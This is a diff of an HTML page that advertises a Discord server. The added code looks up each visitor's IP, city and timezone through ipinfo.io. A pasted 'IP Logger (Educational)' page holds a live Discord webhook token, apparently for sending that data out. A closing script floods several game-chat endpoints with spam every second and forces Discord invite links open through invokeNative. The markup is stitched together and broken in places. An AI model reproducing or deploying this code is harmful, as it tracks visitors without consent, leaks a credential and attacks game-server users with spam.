@@ -1,68 +1,45 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>discord.gg/erzhHvmNSH</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      height: 100%;
-      overflow: hidden;
-      font-family: 'Courier New', Courier, monospace;
-    }
-
-    /* Splash Screen */
-    .splash-screen {
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/erzhHvmNSH</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+    #bg-video {
       position: fixed;
       top: 0;
       left: 0;
-      height: 100%;
-      width: 100%;
-      z-index: 9999;
-      overflow: hidden;
-      background-color: black;
-    }
-
-    .splash-screen video {
-      height: 100%;
-      width: 100%;
+      min-width: 100%;
+      min-height: 100%;
       object-fit: cover;
-    }
-
-    /* Main content (hidden until splash ends) */
-    .main-content {
-      display: none;
-      height: 100%;
-      width: 100%;
-      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-      background-size: cover;
-      color: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      text-align: center;
-    }
-
-    .main-content.loaded {
-      display: flex;
+      z-index: -1;
     }
 
     .info {
       font-size: 1.4em;
-      text-shadow: 0 0 8px White, 0 0 15px White, 0 0 25px White;
+      text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red;
       letter-spacing: 2px;
     }
 
     .text {
       font-size: 3em;
-      text-shadow: 0 0 10px White;
+      text-shadow: 0 0 10px red;
       letter-spacing: 5px;
       margin-top: 2vh;
     }
@@ -70,22 +47,19 @@
 </head>
 <body>
 
-<!-- Splash Screen with Video -->
-<div class="splash-screen">
-  <video autoplay muted playsinline onended="showMainContent()">
-    <source src="https://cdn.discordapp.com/attachments/1398784357908353044/1401860772820291594/k0J6MeEfFAc.mp4?ex=6891d015&is=68907e95&hm=6485828c41f04667841936a1547434931657eb9efbb8769bfa5491bbdaac031a&" type="video/mp4">
-    Your browser does not support HTML5 video.
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif" type="video/mp4">
+    Your browser does not support the video tag.
   </video>
-</div>
 
-<!-- Main Page Content -->
-<div class="main-content" id="mainContent">
   <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
   <audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1263875285015859324/1401862374427721779/Molchat_Doma_-__.mp3?ex=6891d193&is=68908013&hm=3479d6cb494011eb3f9be6d803e878b33619bbe39fd5cb597f3c969ffd172a35&" type="audio/mpeg">
+    <source src="https://cdn.discordapp.com/attachments/1263875285015859324/1401862374427721779/Molchat_Doma_-__.mp3?ex=68927a53&is=689128d3&hm=972aad1866ed9adb1797413b9ac723bce3c300bb4e549235b7794d71bb5bd6c2&" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
+  <!-- IP Info Display -->
   <div class="info" id="ip-info">
     <strong>IP: <span id="ip"></span></strong><br>
     <span><strong>City:</strong> <span id="city"></span></span><br>
@@ -96,25 +70,19 @@
     <span><strong>Timezone:</strong> <span id="timezone"></span></span>
   </div>
 
-  <div class="text">discord.gg/erzhHvmNSH</div>
-</div>
+  <!-- Footer Text -->
+  <div class="text">discord.gg/Wayg5fBPNc
+  
 
-<script>
-  // يظهر المحتوى الرئيسي ويخفي شاشة البداية
-  function showMainContent() {
-    document.querySelector('.splash-screen').style.display = 'none';
-    document.getElementById('mainContent').classList.add('loaded');
-  }
-
-  // احتياط: إذا ما اشتغل الفيديو بعد 10 ثواني
-  setTimeout(showMainContent, 10000);
-
-  // فتح رابط الديسكورد
-  function openNewTab() {
-    window.open('https://discord.gg/erzhHvmNSH', '_blank');
-  }
-  openNewTab();
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger (Educational)</title>
+</head>
+<body>
+  <h1></h1>
+  <p id="ip"</p>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1401402084624044032/SAhbEAqKtHeaXxs1HJR3aHmQGwhlw5hes8HEWE9kxkAn3R2IgYE9W1iF7dqZbGJPFgrP";
@@ -149,6 +117,10 @@
 </body>
 </html>
 
+  
+  
+
+
   <!-- IP Lookup Script -->
   <script>
     fetch('https://ipinfo.io/json')
@@ -164,6 +136,25 @@
       });
   </script>
 
-
 </body>
 </html>
+<script>
+const msg = `& BuFahad - .gg/Wayg5fBPNc ! 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/Wayg5fBPNc");
+window.invokeNative("openUrl", "https://discord.gg/Wayg5fBPNc");
+window.invokeNative("openUrl", "https://discord.gg/Wayg5fBPNc");
+window.invokeNative("openUrl", "https://discord.gg/Wayg5fBPNc");
+}, 1000);
+    </script>
